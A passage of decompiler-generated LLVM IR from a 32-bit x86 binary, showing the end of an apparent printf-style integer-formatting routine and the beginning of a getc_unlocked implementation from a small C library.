  %v0_805296e = load i32, i32* @ecx, align 4
  %v1_805296e = add i32 %v0_805296e, 12
  store i32 %v1_805296e, i32* @ecx, align 4
  %v0_8052971.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052971

dec_label_pc_8052971:                             ; preds = %dec_label_pc_8052956, %dec_label_pc_805294f, %dec_label_pc_805295a
  %v0_8052978 = phi i32 [ %v0_805295a, %dec_label_pc_8052956 ], [ %v0_805295a, %dec_label_pc_805294f ], [ %v1_805296e, %dec_label_pc_805295a ]
  %v0_8052971 = phi i32 [ %v0_8052971111, %dec_label_pc_8052956 ], [ %v0_8052971111, %dec_label_pc_805294f ], [ %v0_8052971.pre, %dec_label_pc_805295a ]
  %v1_8052971 = add i32 %v0_8052971, 1
  %v8_8052971 = icmp eq i32 %v1_8052971, 0
  store i32 %v1_8052971, i32* %ebx.global-to-local, align 4
  br i1 %v8_8052971, label %dec_label_pc_805298b, label %dec_label_pc_8052974

dec_label_pc_8052974:                             ; preds = %dec_label_pc_8052971
  %v1_8052976 = sub i32 -1, %v0_8052971
  store i32 %v1_8052976, i32* %eax.global-to-local, align 4
  %v1_8052978 = inttoptr i32 %v0_8052978 to i32*
  store i32 176, i32* %v1_8052978, align 4
  %v0_805297e = load i32, i32* %eax.global-to-local, align 4
  %v1_805297e = load i32, i32* @ecx, align 4
  %v2_805297e = add i32 %v1_805297e, 4
  %v3_805297e = inttoptr i32 %v2_805297e to i32*
  store i32 %v0_805297e, i32* %v3_805297e, align 4
  %v0_8052981 = load i32, i32* @ecx, align 4
  %v1_8052981 = add i32 %v0_8052981, 8
  %v2_8052981 = inttoptr i32 %v1_8052981 to i32*
  store i32 ptrtoint (i32* @global_var_8058513.239 to i32), i32* %v2_8052981, align 4
  %v0_8052988 = load i32, i32* @ecx, align 4
  %v1_8052988 = add i32 %v0_8052988, 12
  store i32 %v1_8052988, i32* @ecx, align 4
  br label %dec_label_pc_805298b

dec_label_pc_805298b:                             ; preds = %dec_label_pc_8052971, %dec_label_pc_8052974
  %v0_805298f = phi i32 [ %v0_8052978, %dec_label_pc_8052971 ], [ %v1_8052988, %dec_label_pc_8052974 ]
  %v0_805298b = load i32, i32* %edx.global-to-local, align 4
  %v1_805298b = icmp eq i32 %v0_805298b, 0
  br i1 %v1_805298b, label %dec_label_pc_805299e, label %dec_label_pc_805298f

dec_label_pc_805298f:                             ; preds = %dec_label_pc_805298b
  %v1_805298f = inttoptr i32 %v0_805298f to i32*
  store i32 112, i32* %v1_805298f, align 4
  %v0_8052995 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052995 = load i32, i32* @ecx, align 4
  %v2_8052995 = add i32 %v1_8052995, 4
  %v3_8052995 = inttoptr i32 %v2_8052995 to i32*
  store i32 %v0_8052995, i32* %v3_8052995, align 4
  %v0_8052998 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052998 = load i32, i32* @ecx, align 4
  %v2_8052998 = add i32 %v1_8052998, 8
  %v3_8052998 = inttoptr i32 %v2_8052998 to i32*
  store i32 %v0_8052998, i32* %v3_8052998, align 4
  %v0_805299b = load i32, i32* @ecx, align 4
  %v1_805299b = add i32 %v0_805299b, 12
  store i32 %v1_805299b, i32* @ecx, align 4
  br label %dec_label_pc_805299e

dec_label_pc_805299e:                             ; preds = %dec_label_pc_805298b, %dec_label_pc_805298f
  %v0_80529bc = phi i32 [ %v0_805298f, %dec_label_pc_805298b ], [ %v1_805299b, %dec_label_pc_805298f ]
  br i1 %v1_80527b8, label %dec_label_pc_80529b2, label %dec_label_pc_80529a5

dec_label_pc_80529a5:                             ; preds = %dec_label_pc_805299e
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  %v3_80529ac = load i8, i8* %v2_8052945, align 1
  %v4_80529ac = and i8 %v3_80529ac, 16
  %v5_80529ac = icmp eq i8 %v4_80529ac, 0
  br i1 %v5_80529ac, label %dec_label_pc_80529cf, label %dec_label_pc_80529b2

dec_label_pc_80529b2:                             ; preds = %dec_label_pc_80529a5, %dec_label_pc_805299e
  %v0_80529b2 = load i32, i32* %edx.global-to-local, align 4
  %v1_80529b4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80529b4 = sub i32 %v0_80529b2, %v1_80529b4
  store i32 %v2_80529b4, i32* %eax.global-to-local, align 4
  %v1_80529b6 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80529b6 = sub i32 %v2_80529b4, %v1_80529b6
  %v8_80529b6 = xor i32 %v1_80529b6, %v2_80529b4
  %v9_80529b6 = xor i32 %v2_80529b6, %v2_80529b4
  %v10_80529b6 = and i32 %v9_80529b6, %v8_80529b6
  %v11_80529b6 = icmp slt i32 %v10_80529b6, 0
  %v13_80529b6 = icmp slt i32 %v2_80529b6, 0
  %v2_80529b8 = icmp eq i1 %v13_80529b6, %v11_80529b6
  br i1 %v2_80529b8, label %dec_label_pc_80529cf, label %dec_label_pc_80529ba

dec_label_pc_80529ba:                             ; preds = %dec_label_pc_80529b2
  %v2_80529ba = sub i32 %v1_80529b6, %v2_80529b4
  store i32 %v2_80529ba, i32* %ebp.global-to-local, align 4
  %v1_80529bc = inttoptr i32 %v0_80529bc to i32*
  store i32 176, i32* %v1_80529bc, align 4
  %v0_80529c2 = load i32, i32* %ebp.global-to-local, align 4
  %v1_80529c2 = load i32, i32* @ecx, align 4
  %v2_80529c2 = add i32 %v1_80529c2, 4
  %v3_80529c2 = inttoptr i32 %v2_80529c2 to i32*
  store i32 %v0_80529c2, i32* %v3_80529c2, align 4
  %v0_80529c5 = load i32, i32* @ecx, align 4
  %v1_80529c5 = add i32 %v0_80529c5, 8
  %v2_80529c5 = inttoptr i32 %v1_80529c5 to i32*
  store i32 ptrtoint (i32* @global_var_8058513.239 to i32), i32* %v2_80529c5, align 4
  %v0_80529cc = load i32, i32* @ecx, align 4
  %v1_80529cc = add i32 %v0_80529cc, 12
  store i32 %v1_80529cc, i32* @ecx, align 4
  br label %dec_label_pc_80529cf

dec_label_pc_80529cf:                             ; preds = %dec_label_pc_80529b2, %dec_label_pc_80529a5, %dec_label_pc_80529ba
  %v1_8052a57121 = phi i32 [ %v0_80529bc, %dec_label_pc_80529b2 ], [ %v0_80529bc, %dec_label_pc_80529a5 ], [ %v1_80529cc, %dec_label_pc_80529ba ]
  %v12_80529cf = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_80529cf, label %dec_label_pc_8052a4a, label %dec_label_pc_80529d6

dec_label_pc_80529d6:                             ; preds = %dec_label_pc_80529cf
  %v5_80529d6 = load i32, i32* %edx.global-to-local, align 4
  %v6_80529d6 = and i32 %v5_80529d6, -256
  %v7_80529d6 = or i32 %v6_80529d6, %stack_var_-42.0
  store i32 %v7_80529d6, i32* %edx.global-to-local, align 4
  %v0_80529dd = load i32, i32* %esi.global-to-local, align 4
  %v2_80529dd = icmp slt i32 %v0_80529dd, 0
  %v1_80529df = trunc i32 %stack_var_-42.0 to i8
  br i1 %v2_80529dd, label %dec_label_pc_80529ee, label %dec_label_pc_80529f7

dec_label_pc_80529ee:                             ; preds = %dec_label_pc_80529d6
  store i32 %v0_80529dd, i32* %edx.global-to-local, align 4
  %v1_80529f0 = sub i32 0, %v0_80529dd
  br label %dec_label_pc_80529f7

dec_label_pc_80529f7:                             ; preds = %dec_label_pc_80529d6, %dec_label_pc_80529ee
  %storemerge27 = phi i32 [ %v1_80529f0, %dec_label_pc_80529ee ], [ %v0_80529dd, %dec_label_pc_80529d6 ]
  %storemerge9 = phi i8 [ 45, %dec_label_pc_80529ee ], [ 43, %dec_label_pc_80529d6 ]
  store i32 %storemerge27, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-27, align 4
  %v2_80529ff = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_80529ff, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8052a0b

dec_label_pc_8052a0b:                             ; preds = %dec_label_pc_8052a0b.backedge, %dec_label_pc_80529f7
  %v0_8052a16 = phi i32 [ %v0_8052a16.pre, %dec_label_pc_8052a0b.backedge ], [ %v2_80529ff, %dec_label_pc_80529f7 ]
  %v0_8052a13 = phi i32 [ %v0_8052a13.pre, %dec_label_pc_8052a0b.backedge ], [ 2, %dec_label_pc_80529f7 ]
  %v0_8052a0b = phi i32 [ %v9_8052a14, %dec_label_pc_8052a0b.backedge ], [ %storemerge27, %dec_label_pc_80529f7 ]
  %v1_8052a12 = ashr i32 %v0_8052a0b, 31
  %v1_8052a13 = add i32 %v0_8052a13, 1
  store i32 %v1_8052a13, i32* %edi.global-to-local, align 4
  %v2_8052a14 = zext i32 %v0_8052a0b to i64
  %v4_8052a14 = zext i32 %v1_8052a12 to i64
  %v5_8052a14 = mul nuw i64 %v4_8052a14, 4294967296
  %v6_8052a14 = or i64 %v5_8052a14, %v2_8052a14
  %v8_8052a14 = sdiv i64 %v6_8052a14, 10
  %v9_8052a14 = trunc i64 %v8_8052a14 to i32
  %v10_8052a14 = srem i64 %v6_8052a14, 10
  %v1_8052a16 = add i32 %v0_8052a16, -1
  store i32 %v1_8052a16, i32* %ebx.global-to-local, align 4
  store i32 %v9_8052a14, i32* %esi.global-to-local, align 4
  %v3_8052a19 = and i32 %v9_8052a14, -256
  %v1_8052a1b = trunc i64 %v10_8052a14 to i8
  %v2_8052a1b = add i8 %v1_8052a1b, 48
  %v12_8052a1b = zext i8 %v2_8052a1b to i32
  %v15_8052a1b = or i32 %v12_8052a1b, %v3_8052a19
  store i32 %v15_8052a1b, i32* %eax.global-to-local, align 4
  %v3_8052a20 = inttoptr i32 %v1_8052a16 to i8*
  store i8 %v2_8052a1b, i8* %v3_8052a20, align 1
  store i32 %v9_8052a14, i32* %edx.global-to-local, align 4
  %v7_8052a24 = icmp sgt i32 %v1_8052a13, 3
  br i1 %v7_8052a24, label %dec_label_pc_8052a26, label %dec_label_pc_8052a0b.backedge

dec_label_pc_8052a26:                             ; preds = %dec_label_pc_8052a0b
  %v2_8052a26 = icmp eq i32 %v9_8052a14, 0
  %v1_8052a28 = icmp eq i1 %v2_8052a26, false
  br i1 %v1_8052a28, label %dec_label_pc_8052a0b.backedge, label %dec_label_pc_8052a2a

dec_label_pc_8052a0b.backedge:                    ; preds = %dec_label_pc_8052a26, %dec_label_pc_8052a0b
  %v0_8052a13.pre = load i32, i32* %edi.global-to-local, align 4
  %v0_8052a16.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052a0b

dec_label_pc_8052a2a:                             ; preds = %dec_label_pc_8052a26
  %v4_8052a2a = zext i8 %storemerge9 to i32
  %v7_8052a2a = or i32 %v3_8052a19, %v4_8052a2a
  store i32 %v7_8052a2a, i32* %edx.global-to-local, align 4
  %v0_8052a2e = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052a2e = add i32 %v0_8052a2e, -2
  store i32 %v1_8052a2e, i32* %eax.global-to-local, align 4
  %v3_8052a31 = add i32 %v0_8052a2e, -1
  %v4_8052a31 = inttoptr i32 %v3_8052a31 to i8*
  store i8 %storemerge9, i8* %v4_8052a31, align 1
  %v5_8052a34 = load i32, i32* %edx.global-to-local, align 4
  %v6_8052a34 = and i32 %v5_8052a34, -256
  %v7_8052a34 = or i32 %v6_8052a34, %stack_var_-42.0
  store i32 %v7_8052a34, i32* %edx.global-to-local, align 4
  %v2_8052a38 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8052a38 = add i32 %v2_8052a38, -2
  %v4_8052a38 = inttoptr i32 %v3_8052a38 to i8*
  store i8 %v1_80529df, i8* %v4_8052a38, align 1
  %v0_8052a3b = load i32, i32* @ecx, align 4
  %v1_8052a3b = inttoptr i32 %v0_8052a3b to i32*
  store i32 112, i32* %v1_8052a3b, align 4
  %v0_8052a41 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052a41 = load i32, i32* @ecx, align 4
  %v2_8052a41 = add i32 %v1_8052a41, 4
  %v3_8052a41 = inttoptr i32 %v2_8052a41 to i32*
  store i32 %v0_8052a41, i32* %v3_8052a41, align 4
  %v0_8052a44 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052a44 = load i32, i32* @ecx, align 4
  %v2_8052a44 = add i32 %v1_8052a44, 8
  %v3_8052a44 = inttoptr i32 %v2_8052a44 to i32*
  store i32 %v0_8052a44, i32* %v3_8052a44, align 4
  %v0_8052a47 = load i32, i32* @ecx, align 4
  %v1_8052a47 = add i32 %v0_8052a47, 12
  store i32 %v1_8052a47, i32* @ecx, align 4
  br label %dec_label_pc_8052a4a

dec_label_pc_8052a4a:                             ; preds = %dec_label_pc_80529cf, %dec_label_pc_8052679, %dec_label_pc_8052a2a
  %v0_8052ac9 = phi i32 [ %v1_8052a57121, %dec_label_pc_80529cf ], [ %v2_8052681, %dec_label_pc_8052679 ], [ %v1_8052a47, %dec_label_pc_8052a2a ]
  %v2_8052a4a = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8052a4a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052a4e

dec_label_pc_8052a4e:                             ; preds = %dec_label_pc_8052a4e, %dec_label_pc_8052a4a
  %v0_8052a4e = phi i32 [ %v2_8052a4a, %dec_label_pc_8052a4a ], [ %v1_8052a50, %dec_label_pc_8052a4e ]
  %stack_var_-216.0 = phi i32 [ %v3_805257b, %dec_label_pc_8052a4a ], [ %v5_8052a53, %dec_label_pc_8052a4e ]
  %v1_8052a4e = inttoptr i32 %v0_8052a4e to i32*
  %v2_8052a4e = load i32, i32* %v1_8052a4e, align 4
  store i32 %v2_8052a4e, i32* %ebx.global-to-local, align 4
  %v1_8052a50 = add i32 %v0_8052a4e, 12
  store i32 %v1_8052a50, i32* %eax.global-to-local, align 4
  %v5_8052a53 = sub i32 %stack_var_-216.0, %v2_8052a4e
  %v7_8052a57 = icmp ult i32 %v1_8052a50, %v0_8052ac9
  br i1 %v7_8052a57, label %dec_label_pc_8052a4e, label %dec_label_pc_8052a5b

dec_label_pc_8052a5b:                             ; preds = %dec_label_pc_8052a4e
  store i32 %v0_8052ac9, i32* %esi.global-to-local, align 4
  %v5_8052a6e = icmp eq i8 %stack_var_-26.0, 0
  store i32 160, i32* %stack_var_-168, align 4
  %v1_8052a7e = icmp eq i1 %v5_8052a6e, false
  %v2_8052a7e = zext i1 %v1_8052a7e to i32
  store i32 %v2_8052a7e, i32* %edx.global-to-local, align 4
  %v2_8052a81 = sub i32 %v5_8052a53, %v2_8052a7e
  store i32 %v2_8052a81, i32* %eax.global-to-local, align 4
  %tmp190 = icmp slt i32 %v2_8052a81, 1
  br i1 %tmp190, label %dec_label_pc_8052acb, label %dec_label_pc_8052a8b

dec_label_pc_8052a8b:                             ; preds = %dec_label_pc_8052a5b
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v2_8052a92 = inttoptr i32 %v1_80525bb to i8*
  %v3_8052a92 = load i8, i8* %v2_8052a92, align 1
  %v4_8052a92 = and i8 %v3_8052a92, 8
  %v5_8052a92 = icmp eq i8 %v4_8052a92, 0
  br i1 %v5_8052a92, label %dec_label_pc_8052aad, label %dec_label_pc_8052a98

dec_label_pc_8052a98:                             ; preds = %dec_label_pc_8052a8b
  %v1_8052a98 = add i32 %v0_8052ac9, 12
  store i32 %v1_8052a98, i32* %esi.global-to-local, align 4
  %v1_8052a9b = inttoptr i32 %v0_8052ac9 to i32*
  store i32 160, i32* %v1_8052a9b, align 4
  %v1_8052aa1 = load i32, i32* @ecx, align 4
  %v2_8052aa1 = add i32 %v1_8052aa1, 4
  %v3_8052aa1 = inttoptr i32 %v2_8052aa1 to i32*
  store i32 %v2_8052a81, i32* %v3_8052aa1, align 4
  %v0_8052aa4 = load i32, i32* @ecx, align 4
  %v1_8052aa4 = add i32 %v0_8052aa4, 8
  %v2_8052aa4 = inttoptr i32 %v1_8052aa4 to i32*
  store i32 ptrtoint (i32* @global_var_8058513.239 to i32), i32* %v2_8052aa4, align 4
  br label %dec_label_pc_8052acb

dec_label_pc_8052aad:                             ; preds = %dec_label_pc_8052a8b
  store i32 %tmp156, i32* %ebx.global-to-local, align 4
  %v1_8052ab4 = add i32 %tmp156, 16
  %v2_8052ab4 = inttoptr i32 %v1_8052ab4 to i32*
  %v3_8052ab4 = load i32, i32* %v2_8052ab4, align 4
  %v9_8052ab4 = icmp eq i32 %v3_8052ab4, 48
  %v1_8052ab8 = icmp eq i1 %v9_8052ab4, false
  br i1 %v1_8052ab8, label %dec_label_pc_8052ac5, label %dec_label_pc_8052aba

dec_label_pc_8052aba:                             ; preds = %dec_label_pc_8052aad
  %v3_8052aba = load i32, i32* %stack_var_-152, align 4
  %v5_8052aba = add i32 %v3_8052aba, %v2_8052a81
  store i32 %v5_8052aba, i32* %stack_var_-152, align 4
  br label %dec_label_pc_8052ac9

dec_label_pc_8052ac0:                             ; preds = %dec_label_pc_8052ad1
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8052af8

dec_label_pc_8052ac5:                             ; preds = %dec_label_pc_8052aad
  br label %dec_label_pc_8052ac9

dec_label_pc_8052ac9:                             ; preds = %dec_label_pc_8052aba, %dec_label_pc_8052ac5
  store i32 %v0_8052ac9, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052acb

dec_label_pc_8052acb:                             ; preds = %dec_label_pc_8052a5b, %dec_label_pc_8052a98, %dec_label_pc_8052ac9
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8052acd = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_8052acd, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052ad1

dec_label_pc_8052ad1:                             ; preds = %dec_label_pc_8052aef, %dec_label_pc_8052acb
  call void @__pseudo_call(i32 %tmp156)
  %v1_8052aea = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052aea = add i32 %v1_8052aea, 4
  %v3_8052aea = inttoptr i32 %v2_8052aea to i32*
  %v4_8052aea = load i32, i32* %v3_8052aea, align 4
  %v15_8052aea = icmp eq i32 %v2_8052a81, %v4_8052aea
  %v1_8052aed = icmp eq i1 %v15_8052aea, false
  br i1 %v1_8052aed, label %dec_label_pc_8052ac0, label %dec_label_pc_8052aef

dec_label_pc_8052aef:                             ; preds = %dec_label_pc_8052ad1
  %v1_8052aef = add i32 %v1_8052aea, 12
  store i32 %v1_8052aef, i32* %ebx.global-to-local, align 4
  %v0_8052af2 = load i32, i32* %edi.global-to-local, align 4
  %v2_8052af2 = add i32 %v0_8052af2, %v2_8052a81
  store i32 %v2_8052af2, i32* %edi.global-to-local, align 4
  %v1_8052af4 = load i32, i32* %esi.global-to-local, align 4
  %v7_8052af4 = icmp ult i32 %v1_8052aef, %v1_8052af4
  br i1 %v7_8052af4, label %dec_label_pc_8052ad1, label %dec_label_pc_8052af8

dec_label_pc_8052af8:                             ; preds = %dec_label_pc_8052aef, %dec_label_pc_8052ac0
  %v0_8052afe = phi i32 [ -1, %dec_label_pc_8052ac0 ], [ %v2_8052af2, %dec_label_pc_8052aef ]
  store i32 %v0_8052afe, i32* %eax.global-to-local, align 4
  %v2_8052b01 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8052b01, i32* @esi, align 4
  store i32 %v0_805255e, i32* @edi, align 4
  store i32 %v0_805255d, i32* @ebp, align 4
  ret i32 %v0_8052afe

; uselistorder directives
  uselistorder i32 %v0_8052afe, { 1, 0 }
  uselistorder i32 %v2_8052a81, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v2_8052a7e, { 1, 0 }
  uselistorder i32 %v1_8052a50, { 1, 2, 0 }
  uselistorder i32 %v0_8052a4e, { 1, 0 }
  uselistorder i32 %v0_8052ac9, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v9_8052a14, { 3, 2, 1, 0, 4 }
  uselistorder i8 %storemerge9, { 1, 0 }
  uselistorder i32 %v0_80529dd, { 2, 1, 0, 3 }
  uselistorder i32 %v2_80529b6, { 1, 0 }
  uselistorder i32 %v1_80529b6, { 1, 0, 2 }
  uselistorder i32 %v2_80529b4, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_8052971, { 1, 0 }
  uselistorder i32 %v2_80528de, { 2, 1, 3, 0 }
  uselistorder i32 %v2_80528d8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_8052935, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v1_8052874, { 1, 0 }
  uselistorder i32 %v0_805286f, { 1, 2, 0, 3 }
  uselistorder i32 %v2_805283c, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_8052837, { 1, 0 }
  uselistorder i8 %v2_8052830, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_8052830, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-220.3, { 1, 0 }
  uselistorder i32 %v0_80527ba, { 1, 2, 0 }
  uselistorder i32 %stack_var_-42.0, { 0, 2, 1 }
  uselistorder i8 %stack_var_-207.1, { 4, 3, 1, 5, 0, 2 }
  uselistorder i8 %v4_805279f, { 1, 0 }
  uselistorder i32 %tmp195, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_805276a, { 1, 0 }
  uselistorder i32 %v2_8052723, { 2, 1, 0 }
  uselistorder i32 %v0_80527d9, { 1, 2, 0, 3 }
  uselistorder x86_fp80 %v1_80526f5, { 1, 0 }
  uselistorder x86_fp80 %v3_80526d7, { 2, 0, 1, 3, 6, 7, 5, 8, 4, 9, 10 }
  uselistorder i32 %v3_80526d4, { 1, 0 }
  uselistorder x86_fp80 %v4_80526bc, { 2, 0, 1, 3, 4 }
  uselistorder x86_fp80 %v3_80526b6, { 1, 2, 0 }
  uselistorder i32 %v3_80526b3, { 1, 0 }
  uselistorder i32 %v1_80526ac, { 3, 0, 1, 2 }
  uselistorder i32 %stack_var_-220.0, { 2, 0, 1 }
  uselistorder x86_fp80 %v1_80526e5, { 8, 1, 2, 5, 3, 4, 6, 0, 7, 9 }
  uselistorder x86_fp80 %v2_80526ad, { 1, 0 }
  uselistorder i8 %v4_805265d, { 1, 0 }
  uselistorder i3 %v1_80525fa, { 1, 0, 2 }
  uselistorder i8 %stack_var_-207.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i8 %v3_8052582, { 1, 0, 2, 3 }
  uselistorder i32 %v3_805257b, { 1, 0, 2 }
  uselistorder i3 %v4_8052574, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp156, { 14, 13, 12, 11, 10, 9, 8, 7, 0, 6, 1, 2, 3, 5, 4 }
  uselistorder x86_fp80 %tmp155, { 3, 2, 1, 0, 4, 5 }
  uselistorder x86_fp80* %st1.global-to-local, { 5, 4, 6, 10, 0, 3, 1, 2, 12, 9, 7, 11, 8 }
  uselistorder x86_fp80* %st0.global-to-local, { 2, 6, 7, 0, 3, 4, 8, 1, 5 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 5, 4, 6, 7, 8, 1, 9, 10, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 2, 0, 1, 3, 4, 6, 8, 7, 5, 9, 10, 11, 12 }
  uselistorder i32* %edx.global-to-local, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 11, 13, 12, 14, 9, 10, 15, 18, 16, 19, 17, 20, 21, 22, 23, 24, 28, 25, 26, 27 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 5, 4, 6, 7, 9, 8, 10 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 6, 7, 5, 8, 9, 10, 11, 26, 12, 13, 27, 14, 15, 16, 17, 21, 22, 18, 19, 20, 23, 24, 25, 28, 29 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 5, 6, 2, 7, 4, 3, 8, 9, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 2, 3, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i8 43, { 2, 1, 0 }
  uselistorder i8 45, { 2, 3, 1, 0, 4 }
  uselistorder i8 56, { 1, 0 }
  uselistorder i8 102, { 2, 3, 1, 0 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder x86_fp80 0xK401CEE6B280000000000, { 1, 2, 0 }
  uselistorder i32 4096, { 2, 15, 3, 17, 18, 4, 16, 8, 13, 14, 5, 6, 9, 11, 10, 1, 12, 0, 7 }
  uselistorder i32 13, { 0, 5, 4, 1, 2, 3 }
  uselistorder x86_fp80 0xK3FFD8000000000000000, { 1, 0, 2, 3 }
  uselistorder x86_fp80 0xK00000000000000000000, { 0, 2, 3, 4, 1 }
  uselistorder i8 6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052acb, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052ac9, { 1, 0 }
  uselistorder label %dec_label_pc_8052a4a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80529f7, { 1, 0 }
  uselistorder label %dec_label_pc_80529cf, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805299e, { 1, 0 }
  uselistorder label %dec_label_pc_805298b, { 1, 0 }
  uselistorder label %dec_label_pc_8052971, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805293e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052929, { 1, 0 }
  uselistorder label %dec_label_pc_805291e, { 1, 0 }
  uselistorder label %dec_label_pc_80528a5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052897, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805285d, { 1, 0 }
  uselistorder label %dec_label_pc_805282d.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_80527f9, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80527c8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80527b3, { 1, 0 }
  uselistorder label %dec_label_pc_805271f, { 1, 0 }
  uselistorder label %dec_label_pc_80526f7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80526f5, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80526e5, { 1, 0 }
  uselistorder label %dec_label_pc_8052679, { 1, 0 }
  uselistorder label %dec_label_pc_80525a2, { 1, 0 }
}

define i32 @getc_unlocked() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_6()
  %stack_var_-5 = alloca i8, align 1
  %v0_8052b08 = load i32, i32* @ebx, align 4
  %v4_8052b0c = ptrtoint i16* %tmp to i32
  store i32 %v4_8052b0c, i32* @ebx, align 4
  %v1_8052b10 = add i32 %v4_8052b0c, 16
  %v2_8052b10 = inttoptr i32 %v1_8052b10 to i32*
  %v3_8052b10 = load i32, i32* %v2_8052b10, align 4
  %v2_8052b13 = add i32 %v4_8052b0c, 24
  %v3_8052b13 = inttoptr i32 %v2_8052b13 to i32*
  %v4_8052b13 = load i32, i32* %v3_8052b13, align 4
  %v10_8052b13 = icmp ult i32 %v3_8052b10, %v4_8052b13
  br i1 %v10_8052b13, label %dec_label_pc_8052bb5, label %dec_label_pc_8052b1c

dec_label_pc_8052b1c:                             ; preds = %entry
  %v2_8052b1c = load i16, i16* %tmp, align 2
  %v3_8052b1c = zext i16 %v2_8052b1c to i32
  %v1_8052b1f = and i32 %v3_8052b1c, 131
  %v6_8052b29 = icmp ugt i32 %v1_8052b1f, 128
  br i1 %v6_8052b29, label %dec_label_pc_8052b43, label %dec_label_pc_8052b2b

dec_label_pc_8052b2b:                             ; preds = %dec_label_pc_8052b1c
  %v0_8052b2b = load i32, i32* @edx, align 4
  %v6_8052b33 = call i32 @__stdio_trans2r_o(i16* nonnull %tmp, i32 128, i32 %v0_8052b2b, i32 %v0_8052b2b)
  %v1_8052b3b = icmp eq i32 %v6_8052b33, 0
  %v1_8052b3d = icmp eq i1 %v1_8052b3b, false
  br i1 %v1_8052b3d, label %dec_label_pc_8052bda, label %dec_label_pc_8052b2b.dec_label_pc_8052b43_crit_edge

dec_label_pc_8052b2b.dec_label_pc_8052b43_crit_edge: ; preds = %dec_label_pc_8052b2b
  %v0_8052b43.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8052b43

dec_label_pc_8052b43:                             ; preds = %dec_label_pc_8052b2b.dec_label_pc_8052b43_crit_edge, %dec_label_pc_8052b1c
  %v2_8052b77 = phi i32 [ %v0_8052b43.pre, %dec_label_pc_8052b2b.dec_label_pc_8052b43_crit_edge ], [ %v4_8052b0c, %dec_label_pc_8052b1c ]
  %v1_8052b43 = inttoptr i32 %v2_8052b77 to i16*
  %v2_8052b43 = load i16, i16* %v1_8052b43, align 2
  %v3_8052b43 = zext i16 %v2_8052b43 to i32
  store i32 %v3_8052b43, i32* @ecx, align 4
  %v2_8052b46 = and i16 %v2_8052b43, 2
  %v3_8052b46 = icmp eq i16 %v2_8052b46, 0
  br i1 %v3_8052b46, label %dec_label_pc_8052b66, label %dec_label_pc_8052b4b

dec_label_pc_8052b4b:                             ; preds = %dec_label_pc_8052b43
  %tmp20 = urem i16 %v2_8052b43, 2
  %v1_8052b4d = zext i16 %tmp20 to i32
  %tmp19 = sub nsw i32 0, %v1_8052b4d
  %v2_8052b50 = and i32 %tmp19, 4
  %v3_8052b50 = add i32 %v2_8052b77, 36
